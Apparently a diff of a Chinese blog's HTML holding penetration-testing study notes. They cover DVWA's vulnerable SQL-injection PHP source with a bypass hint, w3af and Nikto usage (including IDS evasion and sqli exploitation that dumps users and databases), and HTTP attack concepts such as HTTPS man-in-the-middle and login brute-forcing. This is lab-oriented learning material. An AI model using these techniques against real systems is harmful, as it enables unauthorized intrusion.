+<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
+<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">    </span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的SQL Injection Source（High）<ul>
+<li>stripslashes（去除”&quot;）</li>
+<li>mysql_real_escape_string</li>
+<li>▲ is_numric（判断是否为数字）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2117,769 +2813,6 @@ Grid：分布式，多个Dispatcher，网格类型</code></pre></blockquote>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/" itemprop="url">Kali Linux笔记(四十)：W3AF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:16+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-w3af"><a href="#1-w3af" class="headerlink" title="1. w3af"></a>1. w3af</h4><blockquote>
-<pre><code>▲ 2019.12.26 Kali未带此软件，通过github下载安装过于复杂，还未成功</code></pre></blockquote>
-<ul>
-<li>Web Application Attack and Audit Framework，基于python语言开发</li>
-<li>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞（和msf框架结合）</li>
-<li>9大类近150个plugin<ul>
-<li><strong>audit</strong>（审计，扫描发现漏洞）</li>
-<li>infrastructure（基础架构，扫描操作系统，Web Server，是否使用waf）</li>
-<li>grep（被动扫描插件类型，根据audit扫描发回的信息进行信息搜索）</li>
-<li>evasion（逃避目标IDS，IBS，WAF的检测）</li>
-<li>mangle（做一些基于正则表达式的计算）</li>
-<li>auth（身份认证）</li>
-<li>bruteforce（暴力破解，fuzz隐藏路径或文件名）</li>
-<li>output（扫描结果output为一种可被其他工具调用的文件）</li>
-<li><strong>crawl</strong>（爬网，通过超链接）</li>
-<li>attack（唯一不可以进行人工修改，已经固定）</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-w3af"><a href="#2-w3af" class="headerlink" title="2. w3af"></a>2. w3af</h4><ul>
-<li>安装（Kali自带版本执行扫描时挂死）<ul>
-<li>cd ~</li>
-<li>apt-get update</li>
-<li>apt-get install -y python-pip w3af</li>
-<li>pip install –upgrade pip</li>
-<li>git clone <a href="https://github.com/andresriancho/w3af.git" target="_blank" rel="noopener">https://github.com/andresriancho/w3af.git</a></li>
-<li>cd w3af</li>
-<li>./w3af_console（./w3af_gui）</li>
-<li>apt-get build-dep python-lxml</li>
-<li>./tmp/w3af_dependency_install.sh</li>
-</ul>
-</li>
-<li>升级<ul>
-<li>git pull</li>
-</ul>
-</li>
-<li>创建快捷方式<ul>
-<li>cp /usr/share/application/w3af.desktop /root/Desktop</li>
-<li>gedit w3af.desktop（修改Exec路径）</li>
-<li>chmod +x w3af</li>
-</ul>
-</li>
-<li>用户接口<ul>
-<li>Console</li>
-<li>Gui</li>
-<li>API</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-w3af-console"><a href="#3-w3af-console" class="headerlink" title="3. w3af_console"></a>3. w3af_console</h4><ul>
-<li>help（显示可用指令）</li>
-<li>plugin（进入plugin子命令）<ul>
-<li>Help（显示可用指令）</li>
-<li>list audit（列出audit类所有的插件）</li>
-<li>audit sqli xss（选择使用的audit类所有的插件）</li>
-<li>grep all</li>
-<li>crawl web_spider</li>
-<li>back</li>
-</ul>
-</li>
-<li>profile（对扫描目标的集成选项）<ul>
-<li>list</li>
-<li>save as self-contained（保存当前配置）</li>
-<li>save as test self-contained</li>
-<li>use（调用）</li>
-</ul>
-</li>
-<li>http-settings（全局性）<ul>
-<li>help</li>
-<li>view（可查看http-settings的设置）</li>
-<li>set（设置）</li>
-<li>save（保存）</li>
-</ul>
-</li>
-<li>misc-settings（全局性）</li>
-<li>target<ul>
-<li>help</li>
-<li>view</li>
-<li>set taget</li>
-</ul>
-</li>
-<li>start</li>
-<li>script<ul>
-<li>script/* .w3af</li>
-</ul>
-</li>
-<li>./w3af_console -s script/sqli.w3af</li>
-</ul>
-<h4 id="4-w3af–身份认证"><a href="#4-w3af–身份认证" class="headerlink" title="4. w3af–身份认证"></a>4. w3af–身份认证</h4><ul>
-<li>HTTP Basic</li>
-<li>NTLM</li>
-<li>Form</li>
-<li>Cookie（双因素身份认证/anti-CSRF tokens U盘令牌格式）</li>
-</ul>
-<blockquote>
-<pre><code>▲ 安装IIS：运行 → appwiz.cpl → 添加/删除组件 → 应用程序服务器 → IIS
-▲ 设置IIS：开始 → 管理工具 → Internet信息服务（IIS）管理器 → 网站 → 默认网站 → 右键 → 属性 → 目录安全性 → 身份验证和访问控制 → 去掉匿名身份认证</code></pre></blockquote>
-<h4 id="5-w3af–基本身份认证"><a href="#5-w3af–基本身份认证" class="headerlink" title="5. w3af–基本身份认证"></a>5. w3af–基本身份认证</h4><ul>
-<li>设置HTTP Basic，设置账号密码</li>
-<li>配置Configuration</li>
-<li>设置Plugin</li>
-<li>可通过抓包，follow TCP流，解码Base64得出用户名密码</li>
-</ul>
-<h4 id="6-w3af–NTLM身份认证"><a href="#6-w3af–NTLM身份认证" class="headerlink" title="6. w3af–NTLM身份认证"></a>6. w3af–NTLM身份认证</h4><ul>
-<li>集成Windows身份认证</li>
-<li>配置Configuration</li>
-<li>设置Plugin</li>
-<li>抓包可看到加密的NTLM信息</li>
-</ul>
-<h4 id="7-w3af–Form身份认证"><a href="#7-w3af–Form身份认证" class="headerlink" title="7. w3af–Form身份认证"></a>7. w3af–Form身份认证</h4><ul>
-<li>不能配置Configuration</li>
-<li>设置Plugin → Auth（detalied/generic）<ul>
-<li>check-string（登陆成功的字符串）</li>
-<li>data_format（数据源代码，格式）</li>
-</ul>
-</li>
-<li>设置Plugin → crawl → Web_spider → only_forward（限定扫描子目录）</li>
-<li>设置Plugin</li>
-</ul>
-<h4 id="8-w3af–Cookie身份认证（绕过令牌ID认证的方式）"><a href="#8-w3af–Cookie身份认证（绕过令牌ID认证的方式）" class="headerlink" title="8. w3af–Cookie身份认证（绕过令牌ID认证的方式）"></a>8. w3af–Cookie身份认证（绕过令牌ID认证的方式）</h4><ul>
-<li>找到网站的Cookie</li>
-<li>w3af只接受严格Cookie格式的文件</li>
-<li>配置Configuration（严格Cookie格式，需要添加时间，最后加00，用TAB键跳转）</li>
-<li>设置Plugin</li>
-</ul>
-<blockquote>
-<pre><code>Cookie文件
-.netscape.com    TRUE    /   FALSE   946684799   NETSCAPE_ID 100103
-Each line represents a single piece of stored information.A tab is inserted between each of the fields
-
-From left-to-right,here is what each field represents:
-domain--The domain that created AND that can read the variable.
-flag--A TRUE/FALSE value indicating if all machines within a given domain can access the variable.This value is set automatically by the browser,depending on the value you set for domain
-Path--The path within the domain that the variable is valid for.
-Secure--A TRUE/FALSE value indicating if a secure connection with the domain is needed to access the variable
-Expiration--The UNIX time that variable will expire on.UNIX time is  as the number of seconds since Jan 1,1970 00:00:00 GMT
-Name--The name of the variable
-Value--The values of the variable</code></pre></blockquote>
-<h4 id="9-w3af–身份认证（截断代理）"><a href="#9-w3af–身份认证（截断代理）" class="headerlink" title="9. w3af–身份认证（截断代理）"></a>9. w3af–身份认证（截断代理）</h4><ul>
-<li>截断代理（▲ 手动Web漏洞挖掘最基础步骤，提交数据代码）</li>
-<li>HTTP header file（另类的身份认证方法）</li>
-<li>保存头文件中不变的变量为一个txt文件，用于Configuration</li>
-<li>Configuration → General → headers_file</li>
-<li>Proxies the HTTP requests,allowing their modification → History → Send Request to Manual Editor（自编辑）</li>
-<li>Proxies the HTTP requests,allowing their modification →History → Fuzzy Request（正则表达式表达）<ul>
-<li>$10$（数字）</li>
-<li>$string.lowercas[:26]$（字母）</li>
-<li>$[‘spam’,’eggss’]$（查找特定字符串）</li>
-<li>$[l.strip() for l in file (‘input.txt’).readline()]$</li>
-</ul>
-</li>
-<li>Proxies the HTTP requests,allowing their modification →History → Compare（比较请求的结果）</li>
-<li>Proxies the HTTP requests,allowing their modification →History → Export Request（导出）</li>
-<li>Proxies the HTTP requests,allowing their modification →History → History → Audit Request with…（调整修改请求内容）</li>
-<li>Cluster responses（ID视图查看）</li>
-</ul>
-<blockquote>
-<pre><code>大部分不变的头部请求：
-Accept-language: en-US,en;q=0.5
-Accept-encoding: gzip,deflate
-Connection: keep-alive
-Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-User Agent: MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12(GUI) MMP/2.0 UP.Link/6.3.1.13.0
-Host: 192.168.20.7
-Referer: http://192.168.20.7/dvwa/vulnerabilities/sqli/
-Cookie: Security=low; PHPSESSID=f8c40e5267bfbb04a6053e9ec8e6293
-Content-type: application/x-www-form-urlencoded
-
-▲ skipfish的fuzz.txt:/usr/share/wfuzz/wordlist/fuzzdb/Discovery/FilenameBruteforce/wordlistSkipfish.fuzz.txt</code></pre></blockquote>
-<h4 id="10-w3af–截断代理技术"><a href="#10-w3af–截断代理技术" class="headerlink" title="10. w3af–截断代理技术"></a>10. w3af–截断代理技术</h4><ul>
-<li>w3af不支持客户端技术（Javascript，Flash，Java applet等）</li>
-<li>截断代理手动爬网（Proxy）<ul>
-<li>crawl → spider_man（Plugin）</li>
-<li>output → export_requests（Output插件）（~/output.b64 64编码）</li>
-<li><a href="http://127.7.7.7/spider_man?terminate（终止spider_man）" target="_blank" rel="noopener">http://127.7.7.7/spider_man?terminate（终止spider_man）</a></li>
-</ul>
-</li>
-<li>crawl → import_results（base64）</li>
-</ul>
-<h4 id="11-w3af–exploit"><a href="#11-w3af–exploit" class="headerlink" title="11. w3af–exploit"></a>11. w3af–exploit</h4><ul>
-<li>Proxies the HTTP requests,allowing their modification（抓取有SQL I njection路径）</li>
-<li>Configuration → General → headers_file（指定头文件）</li>
-<li>Target（设置Plugin → sqli）</li>
-<li>Start</li>
-<li>Results → Request/Response navigator（查看是否有SQL 语法报错）</li>
-<li>Exploit → Linux命令<ul>
-<li>payload（用法：payload users）</li>
-<li>users</li>
-<li>dbs</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%94)%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%94)%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/" itemprop="url">Kali Linux笔记(三十五)：HTTP协议基础</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:16+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-WEB技术发展"><a href="#1-WEB技术发展" class="headerlink" title="1. WEB技术发展"></a>1. WEB技术发展</h4><ul>
-<li>静态WEB（针对Web Server的攻击）</li>
-<li>动态WEB（针对Web程序代码阶段的攻击）<ul>
-<li>应用程序</li>
-<li>数据库</li>
-<li>每人看到的内容不同</li>
-<li>根据用户输入返回不同结果</li>
-</ul>
-</li>
-<li>Web攻击类型有数百种</li>
-</ul>
-<h4 id="2-WEB攻击面"><a href="#2-WEB攻击面" class="headerlink" title="2. WEB攻击面"></a>2. WEB攻击面</h4><ul>
-<li>Network</li>
-<li>OS</li>
-<li>WEB Server（十几年前最主要的架构）</li>
-<li>App Server</li>
-<li>Web Application（现在攻击集中点）</li>
-<li>Database（现在攻击集中点）</li>
-<li>Browser</li>
-</ul>
-<blockquote>
-<pre><code>Web分层：Browser → Network →（（Application Server → Database）Web Server）OS</code></pre></blockquote>
-<h4 id="3-HTTP协议基础"><a href="#3-HTTP协议基础" class="headerlink" title="3. HTTP协议基础"></a>3. HTTP协议基础</h4><ul>
-<li>明文协议<ul>
-<li>无内建的机密性安全机制</li>
-<li>嗅探或代理截断可查看全部明文信息</li>
-<li>https只能提高传输层安全（只在传输过程中起到加密作用）（https劫持，中间人劫持路由器）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>https过程：
-1.服务器下发证书给客户端
-2.客户端验证服务器的证书
-3.客户端用服务器证书的公钥加密随机生成对称密钥发给服务器
-4.服务器用私钥解密客户端发过来的数据，拿到对称密钥
-5.进行通信，加密数据都用对称密钥
-https流量劫持（在Network中间）：
-1.黑客根据服务器端（名称，邮箱地址）生成一张伪造的证书（伪证书跟服务器端很像）
-2.作为中间人（拥有真证书的公钥，拥有假证书的私钥）</code></pre></blockquote>
-<ul>
-<li>无状态<ul>
-<li>每一次客户端和服务器端的通信都是独立的过程</li>
-<li>WEB应用需要跟踪客户端会话（多步通信）</li>
-<li>不使用cookie的应用，客户端每次请求都要重新身份验证（不现实）</li>
-<li>Session用于用户身份验证后跟踪用户行为轨迹（提高用户体验，但增加了攻击向量）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>Cookie实现:
-1.客户端登陆服务器端进行身份认证
-2.服务器端下发Cookie给客户端
-3.客户端把Cookie放在http头部发给服务器端
-4.服务器端可以定时更新会话的Cookie，保证安全
-▲ Cookie严格上来说等同于Session ID</code></pre></blockquote>
-<h4 id="4-HTTP协议基础"><a href="#4-HTTP协议基础" class="headerlink" title="4. HTTP协议基础"></a>4. HTTP协议基础</h4><ul>
-<li>Cycle（header+body）<ul>
-<li>请求/响应</li>
-</ul>
-</li>
-<li>重要的header<ul>
-<li>Set-Cookie：服务器发给客户端的SessionID（被窃取的风险）</li>
-<li>Content-Length：响应body部分的字节长度（基于web服务器的暴力破解，模糊测试）</li>
-<li>Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面</li>
-<li>Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现）</li>
-<li>Referrer：发起新请求之前用户位于哪个界面，服务器基于此头的安全限制很容易被修改绕过（很弱的访问控制，客户端可以修改Referrer来绕过）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>暴力破解Web页面账号密码：密码错误和密码正确的Content-Length长度可能不同，可基于Content-Length判断是否密码破解成功</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%83)%EF%BC%9ANikto/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%83)%EF%BC%9ANikto/" itemprop="url">Kali Linux笔记(三十七)：Nikto</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-NIKTO"><a href="#1-NIKTO" class="headerlink" title="1. NIKTO"></a>1. NIKTO</h4><ul>
-<li>Perl语言开发的开源web安全扫描器</li>
-<li>扫描软件版本</li>
-<li>扫描搜索存在安全隐患的文件（压缩包留下的未压缩文件）</li>
-<li>扫描服务器配置漏洞（默认配置文件存在的漏洞）</li>
-<li>WEB Application层面的安全隐患</li>
-<li>避免404误判<ul>
-<li>很多服务器不遵守RFC标准，对于不存在的对象返回200响应码</li>
-<li>依据响应文件内容判断，不同扩展名的文件404响应内容不同</li>
-<li>去除时间信息后的内容取MD5值哈希摘要（对于404响应内容）</li>
-<li>-no404（每次扫描前不会尝试扩展名的判断，考虑性能可使用）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>改进后的NIKTO：在扫描之前，会从软件数据库中，提取各自扩展名组成随机页面请求，判断是否存在，然后根据不存在的页面去除时间信息后的静态内容取MD5哈希摘要，作为扫描结果404的比对，来进行一定程度的规避404的误判，提高扫描准确性</code></pre></blockquote>
-<h4 id="2-NIKTO"><a href="#2-NIKTO" class="headerlink" title="2. NIKTO"></a>2. NIKTO</h4><ul>
-<li><strong><code>🔺命令：nikto -list -plugins</code></strong>（插件列表）</li>
-<li><strong><code>🔺命令：nikto -update</code></strong>（官方网站对插件的更新，可能需要代理）▲ 2019.12.23 需要通过pull directly from git<ul>
-<li>cirt.net</li>
-<li><a href="http://cirt.net/nikto/UPDATES" target="_blank" rel="noopener">http://cirt.net/nikto/UPDATES</a></li>
-<li>Plugins：shellshock（破壳漏洞注意）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：nikto -host http://1.1.1.1 -output</code></strong></li>
-<li><strong><code>🔺命令：nikto -host 192.168.1.1 -ssl -port 443,8443,995</code></strong></li>
-<li><strong><code>🔺命令：nikto -host host.txt</code></strong>（一行表示一个要扫描的主机）</li>
-<li><strong><code>🔺命令：nmap -p80 192.168.1.0/24 -oG（grep输出）-（输出结果）| nikto -host - ▲ 2019.12.23</code></strong> 语句通过管道连接报错，单独语句可以执行</li>
-<li><strong><code>🔺命令：nikto -host 192.168.1.1 -userproxy</code></strong> <a href="http://localhost:22716（本机代理）" target="_blank" rel="noopener">http://localhost:22716（本机代理）</a></li>
-<li>-vhost（虚拟主机，一个IP多个主机，通过主机头判断，扫描需要域名，不可IP地址）</li>
-</ul>
-<h4 id="3-NIKTO–interactive（扫描过程的交互，停止可以再次按命令）"><a href="#3-NIKTO–interactive（扫描过程的交互，停止可以再次按命令）" class="headerlink" title="3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）"></a>3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）</h4><ul>
-<li>Space–report current scan status（报告当前扫描状态）</li>
-<li>v–verbose mode on/off（显示详细信息）</li>
-<li>d–debug mode on/off（最详细信息，调试信息，发送的http请求）</li>
-<li>e–error reporting on/off（错误报告显示）</li>
-<li>p–progress reporting on/off（进程信息显示）</li>
-<li>r–redirect display on/off（重定向显示）</li>
-<li>c–cookie display on/off（服务器所给的cookie显示）</li>
-<li>a–auth display on/off（身份认证过程显示）</li>
-<li>q–quit（退出扫描）</li>
-<li>N–next host（下一个主机）</li>
-<li>P–Pauser（暂停扫描）</li>
-</ul>
-<blockquote>
-<pre><code>NIKTO不支持表单账号密码身份认证，只支持https身份认证（id+，id:pass:realm），但可以通过设置指定Cookie进行扫描Web Applicattion，需要设置配置文件</code></pre></blockquote>
-<h4 id="4-NIKTO-配置"><a href="#4-NIKTO-配置" class="headerlink" title="4. NIKTO 配置"></a>4. NIKTO 配置</h4><ul>
-<li>默认配置文件（/etc/nikto.conf）</li>
-<li>需要注意的参数<ul>
-<li>USERAGENT（客户端代理，默认设置Nikto/@VERSION）</li>
-<li>RFIURL（远程文件包含默认文件，可自己修建自己的URL）</li>
-<li>CIRT（默认更新的IP地址）</li>
-<li>PROXYHOST/PROXYPORT/PROXYUSER/PROXYPASS（代理，可以修改代理）</li>
-<li>STATIC-COOKIE=”cookie1”=”cookie value”;”cookie2”=”cooke val”（设置cookie）</li>
-</ul>
-</li>
-<li>-evasion：使用LibWhisker对IDS的躲避技术，可使用以下几种类型（可指定多种）：<ul>
-<li>Random URL encoding(non-UTF8)–随机URL编码（非UTF-8方式 ）</li>
-<li>Directory self-reference(/./)–自选择路径（/./）</li>
